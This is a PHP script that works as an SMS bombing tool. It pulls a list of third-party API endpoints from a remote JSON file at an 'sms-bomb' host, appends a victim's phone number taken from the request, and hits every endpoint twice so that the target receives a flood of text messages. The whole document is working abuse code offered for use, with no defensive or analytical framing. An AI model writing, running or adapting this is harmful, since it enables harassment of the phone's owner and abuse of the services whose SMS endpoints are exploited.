<?php

// Function to make a GET request to the API
function makeRequest($url) {
    // Sleep for 1 second
    sleep(1);

    // Initialize cURL session
    $curl = curl_init();

    // Set cURL options
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
    ]);

    // Execute cURL request
    $response = curl_exec($curl);

    // Check for errors
    if (curl_errno($curl)) {
        $error_msg = curl_error($curl);
        echo "Error: $error_msg\n";
    }

    // Close cURL session
    curl_close($curl);

    // Return the response
    return $response;
}

// Load JSON file from URL
$json_url = "https://sms-bomb.vercel.app/file/bombapi.json";
$json_data = file_get_contents($json_url);

// Decode JSON data
$data = json_decode($json_data, true);

// Iterate through each API endpoint
foreach ($data['api'] as $api) {
    // Construct API endpoint URL
    $api_url = $api . $_GET['phone'];

    // Make GET request to API endpoint
    $response = makeRequest($api_url);

    // Output response
    echo "API: $api\n";
    echo "Response: $response\n";
}

// After requesting all APIs, make one more request to each API
echo "\nMaking one more request to each API:\n";

foreach ($data['api'] as $api) {
    // Construct API endpoint URL
    $api_url = $api . $_GET['phone'];

    // Make GET request to API endpoint
    $response = makeRequest($api_url);

    // Output response
    echo "API: $api\n";
    echo "Response: $response\n";
}

?>
